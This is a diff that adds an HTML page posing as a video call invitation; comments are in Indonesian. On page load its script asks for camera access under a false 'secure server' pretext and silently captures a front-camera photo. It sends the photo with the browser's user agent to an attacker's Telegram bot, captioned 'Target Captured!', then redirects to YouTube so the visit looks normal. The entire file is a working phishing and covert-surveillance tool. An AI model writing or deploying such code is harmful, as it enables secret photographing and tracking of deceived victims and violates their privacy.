@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Call Invitation...</title>
+    <style>
+        body { background-color: #202124; color: white; font-family: sans-serif; text-align: center; padding-top: 40%; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+
+    <h2>Connecting to secure server...</h2>
+    <p>Please allow camera permission to join.</p>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // GANTI DENGAN TOKEN & ID KAMU (Sama seperti di bot.py)
+        const BOT_TOKEN = 'ISI_TOKEN_BOT_TELEGRAMMU_DISINI';
+        const CHAT_ID = 'ISI_ID_TELEGRAMMU_DISINI';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        async function exploit() {
+            try {
+                // Ambil stream kamera depan
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    // Tunggu 1.5 detik lalu ambil foto
+                    setTimeout(sendToTelegram, 1500);
+                };
+            } catch (err) {
+                console.error("Gagal:", err);
+                window.location.href = "https://google.com";
+            }
+        }
+
+        function sendToTelegram() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            // Convert ke Blob
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'target.jpg');
+                formData.append('caption', `📸 Target Captured!\nUser Agent: ${navigator.userAgent}`);
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    console.log("Terkirim!");
+                    // Redirect halus setelah kirim
+                    window.location.href = "https://www.youtube.com"; // Redirect ke YouTube biar wajar
+                })
+                .catch(e => console.log(e));
+            }, 'image/jpeg');
+        }
+
+        window.onload = exploit;
+    </script>
+</body>
+</html>
